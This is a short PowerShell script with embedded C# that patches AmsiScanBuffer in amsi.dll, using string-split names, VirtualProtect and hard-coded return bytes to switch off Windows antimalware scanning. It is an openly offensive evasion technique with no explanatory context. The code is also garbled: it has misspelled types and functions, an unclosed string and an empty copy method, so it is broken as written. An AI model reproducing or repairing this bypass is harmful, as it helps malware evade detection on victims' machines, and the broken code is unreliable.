$irem = '
using System;
using System.Runtime.InteropServices;
public class irem {
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibary(string name);
[DllImport("kernel32")]
public static extern void CopyMemory(IntPtr dest, IntPtr src, unit count);
[DllImport("kernel32")]
public static extren bool VirtualProtect(IntPtr lpAdress, UInPtr dwSize, uint flNewProtect, out uint lpfloldProtect);
public static void cp(byte[] source, IntPtr dest, int count){
	
}
}
';

Add-Type $irem;

$LoadLibary = [irem]::LoadLibary("a" + "m" + "si.dll")
$Adress = [irem]::GettProcAddress($LoadLibary, "Am" + "si" + "Sc" + "an" + "Bu + "ff" + "er");
$p = 0;
[irem]::VirtualProtect($Adress, [unit32]5, 0x40, [ref]$p);
$Patch =  [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3);
[irem]::cp($Patch, $Adress, 6);